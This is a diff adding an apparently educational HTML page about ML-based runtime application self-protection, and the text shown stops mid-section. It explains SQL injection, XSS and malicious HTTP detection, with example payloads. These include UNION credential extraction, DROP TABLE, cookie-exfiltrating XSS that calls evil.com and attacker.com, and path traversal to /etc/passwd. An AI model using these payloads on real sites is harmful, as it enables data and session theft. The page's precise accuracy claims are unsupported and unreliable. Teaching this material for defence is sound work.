@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RASP-Lab - Runtime Application Self-Protection Laboratory</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=Fira+Code:wght@400;600&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+    <!-- Header Navigation -->
+    <header>
+        <div class="header-container">
+            <a class="logo">
+                <span class="logo-text">RASP-Lab</span>
+            </a>
+            <nav>
+                <a onclick="showSection('overview', this)" class="active">Overview</a>
+                <a onclick="showSection('sql-injection', this)">SQL Injection</a>
+                <a onclick="showSection('xss', this)">XSS Detection</a>
+                <a onclick="showSection('http-requests', this)">HTTP Analysis</a>
+                <a onclick="showSection('ml-model', this)">ML Model</a>
+                <a onclick="showSection('resources', this)">Resources</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <!-- Overview Section -->
+        <section id="overview" class="active">
+            <div class="card">
+                <h2>Welcome to RASP-Lab</h2>
+                <p>
+                    RASP-Lab is an educational platform demonstrating how Runtime Application Self-Protection (RASP)
+                    systems use Machine Learning to detect and block real-time attacks. This laboratory provides
+                    comprehensive demonstrations of SQL Injection, Cross-Site Scripting (XSS), and malicious HTTP
+                    request detection.
+                </p>
+                <p>
+                    Our ML-powered detection engine analyzes request patterns, payload characteristics, and
+                    behavioral signatures to identify threats with high accuracy and minimal false positives.
+                </p>
+            </div>
+
+            <div class="grid">
+                <div class="stat-box">
+                    <div class="stat-number">98.7%</div>
+                    <div class="stat-label">Detection Accuracy</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">50K+</div>
+                    <div class="stat-label">Threat Patterns</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">&lt;10ms</div>
+                    <div class="stat-label">Response Time</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">0.2%</div>
+                    <div class="stat-label">False Positive Rate</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>What is RASP?</h3>
+                <p>
+                    Runtime Application Self-Protection (RASP) is a security technology that monitors
+                    application behavior at runtime to detect and prevent real-time attacks. Unlike traditional
+                    WAFs (Web Application Firewalls) that operate at the network perimeter, RASP operates
+                    inside the application, providing deep visibility and precise threat detection.
+                </p>
+                <p>
+                    RASP works by instrumenting the application code and monitoring how it processes data,
+                    executes queries, and interacts with the system. When malicious activity is detected,
+                    RASP can immediately block the attack before it causes damage.
+                </p>
+
+                <h3>Key Features</h3>
+                <ul>
+                    <li><strong>Real-time Detection:</strong> Analyze requests as they execute within the application
+                    </li>
+                    <li><strong>Machine Learning:</strong> Adaptive threat detection and pattern recognition</li>
+                    <li><strong>Zero-Day Protection:</strong> Detect unknown attack vectors through behavioral analysis
+                    </li>
+                    <li><strong>Behavioral Analysis:</strong> Monitor application behavior for anomalies and suspicious
+                        patterns</li>
+                    <li><strong>Minimal Overhead:</strong> Optimized for performance with &lt;10ms response time</li>
+                    <li><strong>Comprehensive Logging:</strong> Detailed threat intelligence and forensics</li>
+                    <li><strong>Context-Aware:</strong> Understands application logic and legitimate use cases</li>
+                    <li><strong>Adaptive Learning:</strong> Continuously learns from new threats and patterns</li>
+                </ul>
+
+                <h3>How RASP Differs from WAF</h3>
+                <table>
+                    <tr>
+                        <th>Feature</th>
+                        <th>RASP</th>
+                        <th>WAF</th>
+                    </tr>
+                    <tr>
+                        <td>Deployment Location</td>
+                        <td>Inside the application</td>
+                        <td>Network perimeter</td>
+                    </tr>
+                    <tr>
+                        <td>Application Context</td>
+                        <td>Full visibility</td>
+                        <td>Limited visibility</td>
+                    </tr>
+                    <tr>
+                        <td>False Positives</td>
+                        <td>Low (0.2%)</td>
+                        <td>Higher (1-5%)</td>
+                    </tr>
+                    <tr>
+                        <td>Response Time</td>
+                        <td>&lt;10ms</td>
+                        <td>10-50ms</td>
+                    </tr>
+                    <tr>
+                        <td>Zero-Day Detection</td>
+                        <td>Behavioral analysis</td>
+                        <td>Signature-based</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="card">
+                <h3>ML Detection Architecture</h3>
+                <div class="code-block">
+                    HTTP Request Arrives
+                    ↓
+                    Feature Extraction
+                    ├─ Statistical Analysis (Entropy, Distribution)
+                    ├─ Syntactic Analysis (Keywords, Tags)
+                    ├─ Behavioral Analysis (Timing, Size)
+                    └─ Semantic Analysis (Intent, Context)
+                    ↓
+                    ML Classification
+                    ├─ Neural Network
+                    ├─ Random Forest (Gradient Boosting)
+                    ├─ SVM (RBF Kernel)
+                    └─ Anomaly Detection
+                    ↓
+                    Ensemble Voting
+                    ↓
+                    Confidence Scoring
+                    ↓
+                    Decision: ALLOW / BLOCK / QUARANTINE
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Protection Coverage</h3>
+                <div class="grid grid-3">
+                    <div class="feature-item">
+                        <h4>SQL Injection</h4>
+                        <p>Detects database query manipulation and unauthorized data extraction attempts</p>
+                    </div>
+                    <div class="feature-item">
+                        <h4>Cross-Site Scripting</h4>
+                        <p>Identifies malicious script injection and DOM-based vulnerabilities</p>
+                    </div>
+                    <div class="feature-item">
+                        <h4>Command Injection</h4>
+                        <p>Blocks OS command execution and system-level attacks</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SQL Injection Section -->
+        <section id="sql-injection">
+            <div class="card">
+                <h2>SQL Injection Detection</h2>
+                <p>
+                    SQL Injection attacks occur when attacker-controlled input is incorporated into SQL queries
+                    without proper sanitization. This allows attackers to manipulate database queries, extract
+                    sensitive data, modify or delete records, and potentially execute system commands.
+                </p>
+                <p>
+                    Our ML model analyzes query patterns, SQL syntax markers, character distributions, and
+                    statistical features to detect injection attempts with high precision and minimal false positives.
+                </p>
+
+                <h3>How SQL Injection Works</h3>
+                <div class="code-block">
+                    Normal Query:
+                    SELECT * FROM users WHERE email = 'user@example.com' AND password = 'pass123'
+
+                    Injected Query:
+                    SELECT * FROM users WHERE email = 'user@example.com' OR '1'='1' AND password = 'pass123'
+
+                    Result: Returns all users instead of validating credentials
+                </div>
+
+                <h3>Detection Methods</h3>
+                <ul>
+                    <li><strong>Pattern Matching:</strong> Identifies SQL keywords and syntax (UNION, SELECT, DROP,
+                        etc.)</li>
+                    <li><strong>Entropy Analysis:</strong> Detects unusual character distributions in input</li>
+                    <li><strong>Behavioral Analysis:</strong> Monitors query execution time and result sets</li>
+                    <li><strong>Contextual Analysis:</strong> Understands expected input format and validates deviations
+                    </li>
+                    <li><strong>Machine Learning:</strong> Ensemble methods detect novel injection techniques</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Test Input Analysis</h3>
+
+                <div class="input-group">
+                    <label class="input-label">Enter a Query or Input to Analyze</label>
+                    <input type="text" id="sqlInput" class="input-field" placeholder="Example: ' OR 1=1 --">
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn" onclick="analyzeSQL()">Analyze Input</button>
+                    <button class="btn btn-secondary" onclick="loadSQLExample1()">Load Example 1</button>
+                    <button class="btn btn-tertiary" onclick="loadSQLExample2()">Load Example 2</button>
+                </div>
+
+                <!-- Server response -->
+                <div id="sqlResult" style="margin-top:1rem; font-size:0.9rem; color:var(--text-secondary);">
+                </div>
+
+                <!-- Risk notification container -->
+                <div id="riskIndicator"></div>
+
+
+
+                <div class="card">
+                    <h3>Common SQL Injection Patterns</h3>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">UNION-Based Injection</div>
+                        <div class="pattern-desc">
+                            Attacker appends UNION SELECT statements to extract data from the database.
+                            This technique allows querying additional tables and columns.
+                        </div>
+                        <div class="pattern-example">
+                            ' UNION SELECT NULL, username, password FROM users--
+                        </div>
+                    </div>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">Time-Based Blind Injection</div>
+                        <div class="pattern-desc">
+                            Uses database delay functions to infer database contents by measuring response time.
+                            Boolean conditions determine the delay.
+                        </div>
+                        <div class="pattern-example">
+                            id=1; WAITFOR DELAY '00:00:05'--
+                        </div>
+                    </div>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">Boolean-Based Blind Injection</div>
+                        <div class="pattern-desc">
+                            Manipulates conditional logic to extract information one bit at a time by observing
+                            true/false responses from the application.
+                        </div>
+                        <div class="pattern-example">
+                            id=1' AND '1'='1 (true) vs id=1' AND '1'='2 (false)
+                        </div>
+                    </div>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">Stacked Queries</div>
+                        <div class="pattern-desc">
+                            Executes multiple SQL statements sequentially. Can modify schema, insert malicious data,
+                            or execute system commands depending on database permissions.
+                        </div>
+                        <div class="pattern-example">
+                            id=1; DROP TABLE users; SELECT * FROM accounts--
+                        </div>
+                    </div>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">Error-Based Injection</div>
+                        <div class="pattern-desc">
+                            Deliberately triggers database errors to extract information from error messages.
+                            Useful for identifying database version and structure.
+                        </div>
+                        <div class="pattern-example">
+                            id=1 AND extractvalue(0x0a, concat(0x7e, version()))--
+                        </div>
+                    </div>
+
+                    <div class="pattern-item">
+                        <div class="pattern-name">Second-Order Injection</div>
+                        <div class="pattern-desc">
+                            Malicious payload is stored in database and executed later when retrieved.
+                            Harder to detect because payload is legitimate when stored.
+                        </div>
+                        <div class="pattern-example">
+                            Stored in database, executed when user views their profile or data
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Detection Capabilities</h3>
+                    <table>
+                        <tr>
+                            <th>Injection Type</th>
+                            <th>Detection Rate</th>
+                            <th>False Positive Rate</th>
+                            <th>Threat Level</th>
+                        </tr>
+                        <tr>
+                            <td>UNION-Based</td>
+                            <td>99.8%</td>
+                            <td>&lt;0.1%</td>
+                            <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                        </tr>
+                        <tr>
+                            <td>Time-Based Blind</td>
+                            <td>98.5%</td>
+                            <td>0.1%</td>
+                            <td><span class="threat-badge threat-high">HIGH</span></td>
+                        </tr>
+                        <tr>
+                            <td>Boolean-Based Blind</td>
+                            <td>97.2%</td>
+                            <td>0.2%</td>
+                            <td><span class="threat-badge threat-high">HIGH</span></td>
+                        </tr>
+                        <tr>
+                            <td>Stacked Queries</td>
+                            <td>99.1%</td>
+                            <td>&lt;0.1%</td>
+                            <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                        </tr>
+                        <tr>
+                            <td>Error-Based</td>
+                            <td>96.8%</td>
+                            <td>0.3%</td>
+                            <td><span class="threat-badge threat-high">HIGH</span></td>
+                        </tr>
+                    </table>
+                </div>
+        </section>
+
+        <!-- XSS Section -->
+        <section id="xss">
+            <div class="card">
+                <h2>Cross-Site Scripting (XSS) Detection</h2>
+                <p>
+                    Cross-Site Scripting (XSS) attacks inject malicious scripts into web pages viewed by other users.
+                    Attackers can steal session cookies, perform unauthorized actions, deface websites, or redirect
+                    users to malicious sites.
+                </p>
+                <p>
+                    Our ML model detects XSS payloads by analyzing HTML/JavaScript patterns, encoding anomalies,
+                    script execution indicators, and behavioral signatures to identify both reflected and stored XSS
+                    attacks.
+                </p>
+
+                <h3>Types of XSS Attacks</h3>
+                <ul>
+                    <li><strong>Reflected XSS:</strong> Malicious script is reflected back to the attacker's browser in
+                        a response</li>
+                    <li><strong>Stored XSS:</strong> Malicious payload is stored in the database and executed for all
+                        users</li>
+                    <li><strong>DOM-Based XSS:</strong> Vulnerability exists in client-side JavaScript logic</li>
+                    <li><strong>Blind XSS:</strong> Payload is stored but execution is not immediately observable</li>
+                </ul>
+
+                <h3>Common Payloads</h3>
+                <div class="code-block">
+                    Direct Script:
+                    &lt;script&gt;alert('XSS')&lt;/script&gt;
+
+                    Event Handler:
+                    &lt;img src=x onerror="alert('XSS')"&gt;
+
+                    JavaScript Protocol:
+                    &lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;
+
+                    Data Exfiltration:
+                    &lt;img src=x onerror="fetch('http://evil.com?c='+document.cookie)"&gt;
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Test XSS Detection</h3>
+                <div class="input-group">
+                    <label class="input-label">Enter XSS Payload</label>
+                    <input type="text" id="xssInput" class="input-field"
+                        placeholder="Example: <script>alert('XSS')</script>">
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn" onclick="analyzeXSS()">Analyze Payload</button>
+                    <button class="btn btn-secondary" onclick="loadXSSExample1()">Load Example 1</button>
+                    <button class="btn btn-tertiary" onclick="loadXSSExample2()">Load Example 2</button>
+                </div>
+
+                <div id="xssRiskIndicator"></div>
+            </div>
+
+            <div class="card">
+                <h3>XSS Attack Variants</h3>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Reflected XSS</div>
+                    <div class="pattern-desc">
+                        Injected script is immediately returned in the server's response.
+                        Typically delivered via URL parameter or form submission.
+                    </div>
+                    <div class="pattern-example">
+                        &lt;img src=x onerror="fetch('//evil.com?c='+document.cookie)"&gt;
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Stored XSS</div>
+                    <div class="pattern-desc">
+                        Malicious payload is stored in the database and executed every time
+                        the page is viewed by any user who accesses that content.
+                    </div>
+                    <div class="pattern-example">
+                        &lt;script&gt;fetch('//attacker.com/steal?data='+document.cookie)&lt;/script&gt;
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">DOM-Based XSS</div>
+                    <div class="pattern-desc">
+                        Vulnerability exists in client-side JavaScript logic when handling user input.
+                        Server never processes the malicious data.
+                    </div>
+                    <div class="pattern-example">
+                        javascript:void(eval('document.location="//evil.com"'))
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Encoded XSS</div>
+                    <div class="pattern-desc">
+                        Uses various encoding techniques (HTML entities, Unicode, Base64) to bypass
+                        security filters while remaining executable.
+                    </div>
+                    <div class="pattern-example">
+                        &lt;img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"&gt;
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">SVG-Based XSS</div>
+                    <div class="pattern-desc">
+                        Uses SVG elements and event handlers to execute JavaScript.
+                        Often bypasses filters that focus on traditional HTML tags.
+                    </div>
+                    <div class="pattern-example">
+                        &lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Attribute-Based XSS</div>
+                    <div class="pattern-desc">
+                        Injects code through HTML attributes using event handlers or attribute-based
+                        techniques to execute JavaScript.
+                    </div>
+                    <div class="pattern-example">
+                        &lt;input onfocus="alert('XSS')" autofocus&gt;
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Detection Capabilities</h3>
+                <table>
+                    <tr>
+                        <th>XSS Type</th>
+                        <th>Detection Rate</th>
+                        <th>False Positive Rate</th>
+                        <th>Threat Level</th>
+                    </tr>
+                    <tr>
+                        <td>Direct Script Tags</td>
+                        <td>99.9%</td>
+                        <td>&lt;0.1%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>Event Handlers</td>
+                        <td>98.7%</td>
+                        <td>0.2%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>JavaScript Protocol</td>
+                        <td>99.2%</td>
+                        <td>&lt;0.1%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>Encoded Payloads</td>
+                        <td>96.5%</td>
+                        <td>0.5%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>SVG-Based XSS</td>
+                        <td>97.3%</td>
+                        <td>0.3%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- HTTP Requests Section -->
+        <section id="http-requests">
+            <div class="card">
+                <h2>Malicious HTTP Request Detection</h2>
+                <p>
+                    Beyond specific attack types like SQL Injection and XSS, our ML model analyzes complete HTTP
+                    requests
+                    to detect anomalous behavior, including suspicious header combinations, encoding anomalies,
+                    protocol abuse, and behavioral indicators of compromise.
+                </p>
+                <p>
+                    The detection engine examines request timing, payload characteristics, HTTP method usage,
+                    header correlations, and user behavior patterns to identify reconnaissance activities and attack
+                    preparation.
+                </p>
+
+                <h3>What Makes a Request Suspicious?</h3>
+                <ul>
+                    <li><strong>Unusual Headers:</strong> Malformed or unexpected HTTP headers</li>
+                    <li><strong>Encoding Anomalies:</strong> Double encoding, null bytes, or special characters</li>
+                    <li><strong>Protocol Violations:</strong> Invalid HTTP methods or malformed requests</li>
+                    <li><strong>Size Anomalies:</strong> Unusually large payloads or parameters</li>
+                    <li><strong>Timing Patterns:</strong> Rapid requests or unusual request sequences</li>
+                    <li><strong>User-Agent Issues:</strong> Known vulnerability scanners or bots</li>
+                    <li><strong>Path Traversal:</strong> Attempts to access parent directories</li>
+                    <li><strong>Parameter Fuzzing:</strong> Testing multiple parameters rapidly</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Analyze HTTP Request</h3>
+                <h3>HTTP Request Analysis</h3>
+
+                <div class="input-group">
+                    <label class="input-label">Simulated Request Body</label>
+                    <input id="httpInput" class="input-field" rows="4" placeholder="Example: { \" username\":
+                        \"admin\" }"></input>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn" onclick="analyzeHTTP()">Analyze Request</button>
+                    <button class="btn btn-secondary" onclick="loadHTTPExample1()">Load Example 1</button>
+                    <button class="btn btn-tertiary" onclick="loadHTTPExample2()">Load Example 2</button>
+                </div>
+
+                <div id="httpRiskIndicator"></div>
+            </div>
+
+
+            <div class="card">
+                <h3>HTTP Threat Indicators</h3>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Protocol Anomalies</div>
+                    <div class="pattern-desc">
+                        Unusual HTTP versions, invalid methods, or header combinations that violate
+                        HTTP specifications or expected application behavior.
+                    </div>
+                    <div class="pattern-example">
+                        Invalid HTTP/1.1 methods | Oversized headers | Missing required headers
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Encoding Attacks</div>
+                    <div class="pattern-desc">
+                        Double encoding, null bytes, Unicode escaping, or other encoding tricks used to bypass filters
+                        and security controls.
+                    </div>
+                    <div class="pattern-example">
+                        %252e%252e%252f (double URL encoding) | %00 (null bytes)
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Path Traversal Indicators</div>
+                    <div class="pattern-desc">
+                        Attempts to access files and directories outside the intended application root directory.
+                        Includes various encoding and bypass techniques.
+                    </div>
+                    <div class="pattern-example">
+                        ../../etc/passwd | ..\\..\\windows\\system32 | ....//....//
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Reconnaissance Patterns</div>
+                    <div class="pattern-desc">
+                        Scanning for vulnerable endpoints, technologies, and configuration.
+                        Includes multiple error responses and parameter discovery.
+                    </div>
+                    <div class="pattern-example">
+                        Multiple 404 responses | Parameter fuzzing | Banner grabbing
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Bot/Scanner Detection</div>
+                    <div class="pattern-desc">
+                        Identifies known vulnerability scanners, security testing tools, and automated attack frameworks
+                        based on user-agent strings and request patterns.
+                    </div>
+                    <div class="pattern-example">
+                        sqlmap | nikto | nmap | masscan | metasploit
+                    </div>
+                </div>
+
+                <div class="pattern-item">
+                    <div class="pattern-name">Brute Force Patterns</div>
+                    <div class="pattern-desc">
+                        Detects rapid sequential requests to the same endpoint or credential submission endpoints
+                        with different payloads.
+                    </div>
+                    <div class="pattern-example">
+                        Rapid login attempts | Multiple authentication failures | Account enumeration
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Detection Capabilities</h3>
+                <table>
+                    <tr>
+                        <th>Threat Type</th>
+                        <th>Detection Rate</th>
+                        <th>False Positive Rate</th>
+                        <th>Threat Level</th>
+                    </tr>
+                    <tr>
+                        <td>Path Traversal</td>
+                        <td>99.5%</td>
+                        <td>&lt;0.1%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>Protocol Anomalies</td>
+                        <td>97.8%</td>
+                        <td>0.4%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>Encoding Attacks</td>
+                        <td>98.2%</td>
+                        <td>0.2%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>Scanner/Bot Activity</td>
+                        <td>99.1%</td>
+                        <td>&lt;0.1%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>Brute Force Attempts</td>
+                        <td>96.7%</td>
+                        <td>0.5%</td>
+                        <td><span class="threat-badge threat-medium">MEDIUM</span></td>
+                    </tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- ML Model Section -->
+        <section id="ml-model">
+            <div class="card">
+                <h2>Machine Learning Model</h2>
+                <p>
+                    RASP-Lab's threat detection engine uses advanced machine learning techniques including
+                    neural networks, ensemble methods, and unsupervised anomaly detection. The model is trained
+                    on millions of threat samples from real-world attacks and continuously updated with new patterns.
+                </p>
+                <p>
+                    The detection system combines multiple machine learning models in an ensemble voting mechanism
+                    to maximize accuracy while minimizing false positives.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>Model Performance Metrics</h3>
+                <div class="grid">
+                    <div class="stat-box">
+                        <div class="stat-number">98.7%</div>
+                        <div class="stat-label">Overall Accuracy</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number">99.2%</div>
+                        <div class="stat-label">Precision</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number">97.8%</div>
+                        <div class="stat-label">Recall</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number">98.5%</div>
+                        <div class="stat-label">F1-Score</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number">0.2%</div>
+                        <div class="stat-label">False Positive</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number">&lt;10ms</div>
+                        <div class="stat-label">Avg Latency</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Feature Engineering</h3>
+                <p>The ML model extracts and analyzes 150+ features from each request:</p>
+                <div class="code-block">
+                    Statistical Features:
+                    • Shannon entropy analysis
+                    • Character distribution patterns
+                    • Byte frequency analysis
+                    • N-gram patterns
+                    • Null byte detection
+
+                    Syntactic Features:
+                    • SQL keyword frequencies
+                    • HTML/JavaScript tag patterns
+                    • Special character ratios
+                    • Encoding analysis
+                    • Bracket balancing
+
+                    Behavioral Features:
+                    • Request timing analysis
+                    • Payload size anomalies
+                    • HTTP header correlations
+                    • Protocol compliance checking
+                    • User-Agent pattern matching
+
+                    Semantic Features:
+                    • Intent analysis
+                    • Context-aware signatures
+                    • Application behavior baselines
+                    • Historical attack patterns
+                    • Reputation scoring
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Ensemble Architecture</h3>
+                <p>Our detection system uses multiple ML techniques in a weighted voting ensemble:</p>
+                <div class="code-block">
+                    Feature Extraction (150+ Features)
+                    ↓
+                    ┌────┴────────┬──────────────┬──────────────┬──────────────┐
+                    ↓ ↓ ↓ ↓ ↓
+                    Neural Network Random Forest SVM Isolation Anomaly
+                    (Gradient) (RBF Kernel) Forest Detector
+                    Boosting
+                    │ │ │ │ │
+                    └─────────────┴──────────────┴──────────────┴──────────────┘
+                    ↓
+                    Ensemble Voting
+                    ↓
+                    Confidence Threshold Analysis
+                    ↓
+                    Decision: SAFE / SUSPICIOUS / THREAT
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Model Components</h3>
+                <div class="feature-item">
+                    <h4>Deep Neural Network (DNN)</h4>
+                    <p>4-layer feed-forward network with dropout and batch normalization for robust feature learning</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Gradient Boosting (XGBoost)</h4>
+                    <p>Decision tree ensemble with 200+ estimators for capturing non-linear patterns</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Support Vector Machine (SVM)</h4>
+                    <p>RBF kernel SVM with probability calibration for decision boundary learning</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Isolation Forest</h4>
+                    <p>Unsupervised anomaly detection for identifying novel attack patterns</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Statistical Anomaly Detector</h4>
+                    <p>Mahalanobis distance-based detector for multivariate outlier detection</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Training Data</h3>
+                <ul>
+                    <li><strong>5M+ Real-World Threat Samples:</strong> Collected from production systems and public
+                        vulnerability databases</li>
+                    <li><strong>2M+ Benign Requests:</strong> Legitimate traffic patterns to minimize false positives
+                    </li>
+                    <li><strong>50K+ Attack Signatures:</strong> Manually curated threat patterns from security research
+                    </li>
+                    <li><strong>Continuous Updates:</strong> Model retrained weekly with new attack patterns</li>
+                    <li><strong>Zero-Day Detection:</strong> Behavioral analysis enables detection of novel attacks</li>
+                    <li><strong>Adaptive Learning:</strong> Feedback from deployed instances improves detection accuracy
+                    </li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Attack Type Performance</h3>
+                <table>
+                    <tr>
+                        <th>Attack Type</th>
+                        <th>Detection Rate</th>
+                        <th>False Positive</th>
+                        <th>Latency</th>
+                    </tr>
+                    <tr>
+                        <td>SQL Injection</td>
+                        <td>99.4%</td>
+                        <td>0.1%</td>
+                        <td>&lt;5ms</td>
+                    </tr>
+                    <tr>
+                        <td>XSS (All Types)</td>
+                        <td>98.6%</td>
+                        <td>0.2%</td>
+                        <td>&lt;6ms</td>
+                    </tr>
+                    <tr>
+                        <td>Command Injection</td>
+                        <td>98.1%</td>
+                        <td>0.3%</td>
+                        <td>&lt;5ms</td>
+                    </tr>
+                    <tr>
+                        <td>Path Traversal</td>
+                        <td>97.9%</td>
+                        <td>0.4%</td>
+                        <td>&lt;4ms</td>
+                    </tr>
+                    <tr>
+                        <td>LDAP Injection</td>
+                        <td>96.8%</td>
+                        <td>0.2%</td>
+                        <td>&lt;5ms</td>
+                    </tr>
+                    <tr>
+                        <td>XML Injection</td>
+                        <td>97.3%</td>
+                        <td>0.3%</td>
+                        <td>&lt;5ms</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="card">
+                <h3>Model Updates & Retraining</h3>
+                <div class="feature-item">
+                    <h4>Weekly Model Retraining</h4>
+                    <p>Model is retrained every week with new attack samples discovered in the wild</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Continuous A/B Testing</h4>
+                    <p>New model versions are tested against production traffic before deployment</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Zero-Day Detection</h4>
+                    <p>Behavioral analysis enables detection of previously unknown attack types</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Federated Learning</h4>
+                    <p>Models trained on multiple organizations' data while preserving privacy</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Resources Section -->
+        <section id="resources">
+            <div class="card">
+                <h2>Resources & Documentation</h2>
+                <p>
+                    RASP-Lab provides comprehensive resources for learning about Runtime Application Self-Protection
+                    and machine learning-based threat detection. Explore the following materials to deepen your
+                    understanding.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>OWASP Top 10 Web Vulnerabilities</h3>
+                <table>
+                    <tr>
+                        <th>Rank</th>
+                        <th>Vulnerability</th>
+                        <th>Detection</th>
+                        <th>Severity</th>
+                    </tr>
+                    <tr>
+                        <td>A01</td>
+                        <td>Broken Access Control</td>
+                        <td>99.1%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>A02</td>
+                        <td>Cryptographic Failures</td>
+                        <td>88.5%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>A03</td>
+                        <td>Injection</td>
+                        <td>99.4%</td>
+                        <td><span class="threat-badge threat-critical">CRITICAL</span></td>
+                    </tr>
+                    <tr>
+                        <td>A04</td>
+                        <td>Insecure Design</td>
+                        <td>78.3%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>A05</td>
+                        <td>Security Misconfiguration</td>
+                        <td>91.7%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>A06</td>
+                        <td>Vulnerable Components</td>
+                        <td>85.2%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>A07</td>
+                        <td>Identification & Auth Failures</td>
+                        <td>96.8%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>A08</td>
+                        <td>Software/Data Integrity Failures</td>
+                        <td>82.1%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>A09</td>
+                        <td>Logging & Monitoring Failures</td>
+                        <td>71.4%</td>
+                        <td><span class="threat-badge threat-medium">MEDIUM</span></td>
+                    </tr>
+                    <tr>
+                        <td>A10</td>
+                        <td>Server-Side Request Forgery</td>
+                        <td>94.2%</td>
+                        <td><span class="threat-badge threat-high">HIGH</span></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="card">
+                <h3>Key Concepts</h3>
+                <div class="feature-item">
+                    <h4>Runtime Application Self-Protection (RASP)</h4>
